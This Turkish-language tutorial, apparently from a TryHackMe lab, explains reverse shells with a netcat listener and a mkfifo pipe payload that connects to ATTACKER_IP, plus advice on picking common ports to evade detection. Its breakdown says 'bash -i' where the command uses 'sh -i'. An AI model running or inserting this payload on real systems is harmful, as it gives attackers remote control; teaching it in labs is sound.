## Reverse Shell

Bazen "connect back shell" olarak da adlandırılan **reverse shell**, siber saldırılarda bir sisteme erişim sağlamak için kullanılan en popüler tekniklerden biridir. Bağlantılar, hedef sistemden saldırganın makinesine doğru başlatılır; bu da ağ firewall'larından (güvenlik duvarları) ve diğer güvenlik donanımlarından kaçınmaya yardımcı olabilir.

### Reverse Shell Nasıl Çalışır?

#### Bir Netcat (nc) Listener Kurun

Şimdi, Netcat aracını kullanarak pratik bir senaryoda bir reverse shell'in nasıl çalıştığını anlayalım. Bu yardımcı program birden fazla **OS**'u destekler ve bir ağ üzerinden okuma ve yazma yapılmasına olanak tanır.

Yukarıda belirtildiği gibi, bir reverse shell saldırganın makinesine geri bağlanacaktır. Bu makine bir bağlantı bekliyor olacaktır, bu nedenle `nc -lvnp 443` komutunu kullanarak bir bağlantıyı dinlemek (listen) için Netcat'i kullanalım.

##### Terminal

Bash

```
attacker@kali:~$ nc -lvnp 443
listening on [any] 443 ...
```

Yukarıdaki komutta; `-l` seçeneği Netcat'e dinlemesini veya bir bağlantı beklemesini belirtir. `-v` seçeneği **verbose** modunu etkinleştirir. `-n` seçeneği, bağlantıların çözümleme için DNS kullanmasını engeller, böylece herhangi bir hostname çözümlemez ve bir IP adresi kullanır. Son olarak, `-p` bayrağı bağlantıyı beklemek için kullanılacak portu belirtir; yukarıdaki örnekte bu port **443**'tür.

Herhangi bir port bağlantı beklemek için kullanılabilir, ancak saldırganlar ve pentester'lar genellikle **53, 80, 8080, 443, 139** veya **445** gibi diğer uygulamalar tarafından kullanılan bilinen portları tercih ederler. Bu, reverse shell trafiğini meşru trafikle karıştırmak ve güvenlik donanımları tarafından tespit edilmekten kaçınmak içindir.

---

### Reverse Shell Erişimi Elde Etme

Listener'ımızı kurduktan sonra, saldırganın **reverse shell payload** olarak bilinen yapıyı yürütmesi gerekir. Bu payload genellikle zafiyeti veya saldırgana verilen yetkisiz erişimi suistimal eder ve shell'i ağ üzerinden dışarı aktaracak bir komut yürütür. Ele geçirilen sistemin araçlarına ve işletim sistemine bağlı olarak çeşitli payload'lar mevcuttur.

Örnek olarak, aşağıda gösterilen **pipe reverse shell** adlı örnek bir payload'ı inceleyelim:

`rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc ATTACKER_IP ATTACKER_PORT >/tmp/f`

#### Payload'ın Açıklaması

- **rm -f /tmp/f**: Bu komut, `/tmp/f/` adresinde bulunan mevcut herhangi bir **named pipe** (adlandırılmış boru) dosyasını siler. Bu, betiğin çakışma olmadan yeni bir named pipe oluşturabilmesini sağlar.
    
- **mkfifo /tmp/f**: Bu komut, `/tmp/f` konumunda bir **named pipe** veya **FIFO** (first-in, first-out) oluşturur. Named pipe'lar, süreçler (processes) arasında iki yönlü iletişime izin verir. Bu bağlamda, girdi ve çıktı için bir kanal görevi görür.
    
- **cat /tmp/f**: Bu komut, named pipe'dan veri okur. Pipe üzerinden gönderilebilecek girdiyi bekler.
    
- **| bash -i 2>&1**: `cat` komutunun çıktısı, saldırganın komutları etkileşimli olarak yürütmesine olanak tanıyan bir shell örneğine (**bash -i**) yönlendirilir (piped). `2>&1` kısmı, **standard error**'u (standart hata) **standard output**'a (standart çıktı) yönlendirerek hata mesajlarının saldırgana geri gönderilmesini sağlar.
    
- **| nc ATTACKER_IP ATTACKER_PORT >/tmp/f**: Bu kısım, shell'in çıktısını `nc` (Netcat) aracılığıyla saldırganın portundaki (ATTACKER_PORT) saldırgan IP adresine (ATTACKER_IP) yönlendirir.
    
- **>/tmp/f**: Bu son kısım, komutların çıktısını tekrar named pipe içine göndererek iki yönlü iletişime olanak tanır.
    

Yukarıdaki payload, **bash** shell'ini ağ üzerinden istenen listener'a ifşa edebilir.

---

### Saldırgan Shell'i Alır

Yukarıdaki payload yürütüldüğünde, saldırgan aşağıda gösterildiği gibi bir **reverse shell** alacaktır; bu da onların işletim sistemindeki normal bir terminale giriş yapmış gibi komutlar yürütmesine olanak tanır.

#### Saldırgan Terminal Çıktısı (Shell Alınıyor)

##### Terminal

Bash

```
attacker@kali:~$ nc -lvnp 443
listening on [any] 443 ...
connect to [10.4.99.209] from (UNKNOWN) [10.10.13.37] 59964
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

target@tryhackme:~$
```

Yukarıdaki çıktı, bağlantının ele geçirilen hedefin IP adresi olan **10.10.13.37** IP'sinden geldiğini göstermektedir.